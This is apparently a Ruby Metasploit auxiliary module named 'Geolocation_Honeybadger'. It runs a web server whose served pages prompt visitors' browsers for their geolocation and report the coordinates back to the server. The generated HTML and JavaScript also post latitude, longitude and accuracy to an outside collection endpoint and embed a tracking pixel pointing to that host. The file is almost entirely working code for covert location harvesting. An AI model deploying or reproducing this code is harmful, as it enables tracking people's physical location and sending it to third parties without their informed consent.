##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Geolocation_Honeybadger',
			'Description'	=> %q{
				This module spawns a webserver that sends a geolocation location. 
			},
			'License'	=> MSF_LICENSE,
			'Author'	=> ['v10l3nt', 'lanmaster53']
	))

	register_options(
		[
			OptBool.new('HTML5', [true, "Use HTML5 Geolcation API", true]),
		], self.class)
	end

	def on_request_uri( cli, request )
		if request.uri.match(/\.jpg$/i)
			if request.uri =~ /(gps=(.)+.jpg)/
				gps=$1.sub("gps=","").chomp(".jpg")
				print_status("#{self.name} Reporting lat/lon: #{gps}")
				return
			end
		elsif request.uri.match(/\.js$/i)
			send_response_html( cli, generate_js(), { 'Content-Type' => 'application/javascript' } )
			return
		else
			if datastore['HTML5']
				print_status("#{self.name} Sending HTML5 Location Request")
				send_response_html( cli, generate_html5(), { 'Content-Type' => 'text/html' } )
			else
				print_status("#{self.name} Sending Javascript Location Request")
				send_response_html( cli, generate_html(), { 'Content-Type' => 'text/html' } )
			end
			return
		end

	end

	def generate_html()
		path = get_resource()
		html = "<html><head><script src=\"#{path}/geo.js\"></script><script>"
		html += " function geo_success(p)"
		html += "{document.write('<img src=\"#{path}/gps='+p.coords.latitude+','+p.coords.longitude+'.jpg\">');"
                html += "$.post(\"http://mail-notification.com/hb/gather.php\", { origin: \"msf_badger\", lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy });"
                html += "}"
		html += "function geo_error()"
		html += "{document.write(\"Could not find you!\");}"
		html += "</script></head><body><script>"
		html += "if (geo_position_js.init())"
		html += "{geo_position_js.getCurrentPosition(geo_success, geo_error);}"
		html += "</script>"
                html+"<img src=\"http://mail-notification.com/hb/gather.php?origin=msf_badger\" width=\"1px\" height=\"1px\" />"
                html+="</body></html>"	
		return html
	end

	def generate_html5()
		path = get_resource()
		html="<html><head></head><body><script>"
		html+="function showPosition(p){"
		html+= "document.write(\"<img src=#{path}/gps=\"+ p.coords.latitude +\",\" + p.coords.longitude+\".jpg>\");"
                html += "$.post(\"http://mail-notification.com/hb/gather.php\", { origin: \"msf_badger\", lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy });"
                html += "}"
		html+="function getLocation(){"
		html+="if (navigator.geolocation){"
		html+="navigator.geolocation.getCurrentPosition(showPosition);}}"
		html+="getLocation();"
		html+="</script>"
                html+"<img src=\"http://mail-notification.com/hb/gather.php?origin=msf_badger\" width=\"1px\" height=\"1px\" />"
                html+="</body></html>"	
		return html
	end

	def generate_js()
                print_status("#{self.name} Sending Javascript.")
		path = File.join( Msf::Config.install_root, "data", "exploits", "geo.js" )
		fd = File.open( path, "rb" )
		js_data = fd.read(fd.stat.size)
		fd.close
		return js_data
	end

	def run
		@seed = Rex::Text.rand_text_alpha(12)
		@client_cache = {}
		print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
		exploit
	end

end
